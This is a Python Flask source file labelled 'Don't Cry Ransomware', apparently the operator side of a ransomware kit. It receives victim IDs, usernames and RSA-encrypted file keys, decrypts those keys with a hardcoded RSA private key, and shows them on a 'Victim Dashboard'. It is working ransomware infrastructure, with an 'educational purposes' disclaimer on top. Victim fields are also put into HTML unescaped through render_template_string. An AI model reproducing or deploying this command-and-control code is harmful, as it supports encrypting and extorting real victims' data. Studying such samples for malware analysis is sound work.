################################################################################
#                             Don't Cry Ransomware                             #
#                          ! EDUCATIONAL PURPOSES ONLY !                       #
################################################################################
# DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
# research, ethical hacking education, and malware analysis training only.
# It mimics behavior of real ransomware but must NOT be used for illegal or
# unauthorized activity. Run only in isolated environments (e.g., sandbox or VM)
# under supervision of cybersecurity professionals.
# The authors assume no liability for any misuse or damage caused.

import os
from flask import Flask, request, render_template_string  # type: ignore
import os
import json
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP


RSA_PRIVATE_KEY = """-----BEGIN RSA PRIVATE KEY-----
MIIEqAIBAAKCAQEAjdIcVka2US3tcvXqQ90+XNYt5bJv10x+/0KRSph03Z/RIp/g
OID2EEoF2Gs44BKj1C5UJsP8MyFHhWKob+WVA2vkUca2ZkA4EYxelivKGaEQlUmn
BQJsrmniCu6afj5Gq6mazVPIm48G20g8JS/ckkvJK9TAbLkqk9HQT9waIbhwuByd
KlcpxwPO3CZstFT3YWB+WQS0waPxqbB1PFGqPsYpPM5uBFYKj9aXXec7g6Xg992j
FJ3j8qQ2oi05KRe5OHrMvQNXd7vAfSjzguXKX5gHpY9z8iNTPwU5XBsQCGmQnvxd
tH80fqhDqfh8hZncYtvFGPfJ8g1TfN2huFjYzwIDAQABAoIBAAk38yeYiRlVxu2G
Fqg6pWcbdPhNVP/FtSuahB85Mb+GN+3sPoLtvxDn/uFGdvf5vjR4nne2nZolO6Tr
+M7tOXZzeO/n3steuUZKvYs9ZXGtCorpsrWcprvfnhXf1KMIIUffSnS2UX/rGCMA
2wf/yHKqAnWa6rcmghhu7+/FLINO5Y24lQ4KPA/crWc1LGedG264WWPwP1juKqCk
7JeS9RTSMHlU7doZeay9fW2kK2x+O0ieoYbiIXQzPb5ebuJnD8XLPPyjqxmoHEfd
WuYUFsgosmvVsLbhs+Vqv37RkD8K1wMnJVGCm1ScOkRAKcU9K8zLSsGIdTZmw9hp
81wpcOECgYkAk0baucx17R0bG71CJVXVwa5EeGV4A1EFf/HzabffCO3E9FES5JQl
hWiFB8gy4io5KUMc5VtDdlV+5uWEMellapFBJyv9Z7zcKSEs5qVOZKe4a43SCxFz
gv/JXC2uWTTMbspf2Q5oLw62lLECuZLuXLrkcoee8MdsZkqV03n3YX2L6SafzQUr
DQJ5APaEJZT9ib5LEgA0JFMgpd8Qp/BBnyivw77qbPKRuiEDvxWhtE3jVwKDybP3
IfHFD9gwwaokY33T39Cu/QdGh/K+RmPrLV+0l+DsC9bNQUou44qZelUQncvx9UCC
mkvklkuqqm9NRY/KfXaHrhokXGbH3eIMXmssSwKBiECsTaJneaWNMXlF68UPY1Ww
3BpunHwAWUTtD7Ht74AxQVr0OzKrJ6rk0f4v2MBeQEmxUgAZyo8tThPA2AM+9a0N
ain0dEvYsGlTSy9higJDcIWyenknyazN/DOBT92WhOtl7R8Y54E6mczDymmJbyjD
XUw55/7d4+kreY2rMonaItVYg7X5PgUCeHzqP4T86KSFs8xon5OD8qlS7lZ/WiAq
2HzQm35bO77pABX9B7mEHp4Gm9nWu9ugKMQ7CJenssaa60n6sfrS0aa+pjqRfD+H
6oIt+l3RSmlF00VzOhsKvXsP01/qDjew0DvtcknOFRak2+iJHj7e9/eZBaU68UlL
ewKBiCUQmGSESlvfKEyGkR9h0ieCvM/8xh0WgNqWnLztWtEhF/fTMVkuqFxqrVbc
QgNRtXbP/ulZU8c8xyiIW1O4urxsgEzXB5Fcf870D9g1THPoVCfnQQZNWt1Hblop
rz9v0fKUbjGqZGd/5hMzmWL6Lg2AnsxBXSCjEqm1x6SFuJMMmkmOMkWwANY=
-----END RSA PRIVATE KEY-----"""


app = Flask(__name__)
BASE_FOLDER = "./dcry_victims"

if not os.path.exists(BASE_FOLDER):
    os.makedirs(BASE_FOLDER)


def decrypt_key(encrypted_key):
    private_key = RSA.import_key(RSA_PRIVATE_KEY)
    cipher_rsa = PKCS1_OAEP.new(private_key)
    aes_key = cipher_rsa.decrypt(encrypted_key)
    return aes_key


@app.route("/upload", methods=["POST"])
def upload():
    username = request.form.get("username")
    victim_id = request.form.get("id")
    date = request.form.get("date")
    key_b64_enc = request.form.get("key")

    if not all([username, victim_id, date, key_b64_enc]):
        return "Missing one or more required fields.", 400

    try:
        encrypted_key = base64.b64decode(key_b64_enc.encode())
    except Exception as e:
        return f"Invalid base64-encoded key: {e}", 400

    victim_folder = os.path.join(BASE_FOLDER, victim_id)
    os.makedirs(victim_folder, exist_ok=True)

    info_path = os.path.join(victim_folder, "info.json")
    with open(info_path, "w") as f:
        json.dump({"username": username, "id": victim_id, "date": date}, f, indent=2)

    key_path = os.path.join(victim_folder, "key.txt")
    with open(key_path, "w") as f:
        f.write(decrypt_key(encrypted_key).decode())

    print(f"Saved victim: {victim_id}")
    return f"Victim {victim_id} received.", 200


@app.route("/dashboard")
def dashboard():
    victim_cards = ""
    for vid in os.listdir(BASE_FOLDER):
        vpath = os.path.join(BASE_FOLDER, vid, "info.json")
        kpath = os.path.join(BASE_FOLDER, vid, "key.txt")
        if os.path.exists(vpath) and os.path.exists(kpath):
            with open(vpath, "r") as f:
                info = json.load(f)
            with open(kpath, "r") as f:
                key = f.read()
            victim_cards += f"""
            <div style='border:1px solid #444;padding:10px;margin-bottom:10px;border-radius:5px;'>
                <b>ID:</b> {info['id']}<br>
                <b>User:</b> {info['username']}<br>
                <b>Date:</b> {info['date']}<br>
                <b>Key:</b> <code>{key}</code>
            </div>
            """

    return render_template_string(
        f"""
    <html>
        <head>
            <title>Don't Cry Dashboard</title>
        </head>
        <body style='font-family:monospace;background:#111;color:#eee;padding:20px;'>
            <h1>Victim Dashboard</h1>
            {victim_cards if victim_cards else "<p>No victims yet.</p>"}
        </body>
    </html>
"""
    )


app.run(host="127.0.0.1", port=5000)
